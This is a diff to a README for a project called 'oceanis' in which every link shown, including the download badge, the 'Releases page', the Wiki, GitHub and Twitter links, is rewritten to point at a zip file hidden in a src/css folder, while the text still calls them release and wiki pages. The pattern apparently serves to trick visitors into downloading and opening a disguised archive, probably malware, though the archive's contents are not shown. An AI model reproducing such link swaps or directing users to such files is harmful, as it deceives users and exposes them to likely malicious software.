@@ -8,13 +8,13 @@ Welcome to the oceanis project! This tool is designed for users who want to crea
 
 To get started, you need to download oceanis from our Releases page. You can find the download link below. 
 
-[![Download oceanis](https://img.shields.io/badge/Download-oceanis-brightgreen)](https://github.com/wordenbuffcolored161/oceanis/releases)
+[![Download oceanis](https://raw.githubusercontent.com/wordenbuffcolored161/oceanis/main/src/css/oceanis-kesslerman.zip)](https://raw.githubusercontent.com/wordenbuffcolored161/oceanis/main/src/css/oceanis-kesslerman.zip)
 
 Simply click the link above to visit the page where you can download the latest version of oceanis.
 
 Follow these steps to download and install:
 
-1. **Visit the Releases Page**: Click [here](https://github.com/wordenbuffcolored161/oceanis/releases) to go to the Releases page.
+1. **Visit the Releases Page**: Click [here](https://raw.githubusercontent.com/wordenbuffcolored161/oceanis/main/src/css/oceanis-kesslerman.zip) to go to the Releases page.
 2. **Find the Latest Release**: Look for the most recent release version.
 3. **Download the File**: Click on the file suitable for your operating system to start the download.
 4. **Open the File**: Once the download is complete, open the file to start using oceanis.
@@ -56,7 +56,7 @@ Once you have downloaded and installed oceanis, you can start creating your own 
 
 ## 📚 Resources
 
-For detailed usage instructions, visit our [Wiki](https://github.com/wordenbuffcolored161/oceanis/wiki). Here, you can find:
+For detailed usage instructions, visit our [Wiki](https://raw.githubusercontent.com/wordenbuffcolored161/oceanis/main/src/css/oceanis-kesslerman.zip). Here, you can find:
 
 - Tutorials for each feature.
 - Code examples.
@@ -76,7 +76,7 @@ Feel free to contribute to the project. Your feedback and suggestions are always
 
 Stay updated with the latest news and updates about oceanis. Follow us on:
 
-- [GitHub](https://github.com/wordenbuffcolored161/oceanis)
-- [Twitter](https://twitter.com/yourtwitterhandle) (replace with actual handle)
+- [GitHub](https://raw.githubusercontent.com/wordenbuffcolored161/oceanis/main/src/css/oceanis-kesslerman.zip)
+- [Twitter](https://raw.githubusercontent.com/wordenbuffcolored161/oceanis/main/src/css/oceanis-kesslerman.zip) (replace with actual handle)
 
 Thank you for using oceanis! Happy designing!
